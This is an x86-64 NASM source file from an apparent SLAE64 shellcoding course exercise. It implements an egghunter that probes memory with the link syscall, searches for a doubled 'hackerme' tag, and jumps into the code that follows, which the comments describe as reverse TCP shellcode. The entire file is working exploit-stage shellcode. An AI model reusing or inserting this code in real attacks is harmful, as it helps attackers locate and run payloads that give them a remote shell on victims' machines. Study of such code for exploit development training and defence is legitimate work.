;---------------------------------
;
; egghunter.nasm
; by Michael Born (@blu3gl0w13)
; Student ID: SLAE64-1439
; November 8, 2016
;
;---------------------------------



global _start

section .text


_start:

	; This is our egghuter
	; it needs to search for 
	; 2 consecutive instances
	; of our 'hackerme' string
	; and then jump into, and execute
	; our reverse TCP shellcode
	;
	; we'll try this out with the link syscall 86
	; and hope we can find and execute our shell
	; in the data section




	xor rdx, rdx			; initialize the registers

page_alignment:
	or dx, 0xfff			; helps set up for page size (0xfff = 4095)

incrementer:
	inc rdx				; increase edx by 1

hunter:
	lea rdi, [rdx + 8]		; put the address of rdx plus 8 bytes into rbx for the syscall
	xor rax, rax			; clear out rax
	mov al, 0x56			; #define __NR_link       86 (0x56)	
	xor rsi, rsi
	syscall				; call it
	cmp al, 0xf2			; compare the return value in rax
	jz page_alignment		; short jump to next page if ZF set
	mov rax, 0x656d72656b636168	; copy 'hackerme' into rax
	mov rdi, rdx			; mov our value in rdx into rdi
	scasq				; compare rax with dword at rdi (in other words, check to see if we have 2 consecutive strings)
	jnz incrementer			; short jump if ZF not set (no match)
	scasq				; make the rax comparison again (match, compare again)
	jnz incrementer			; short jump if ZF not set (no match)
	jmp rdi				; we found a match! pwnage!!! 

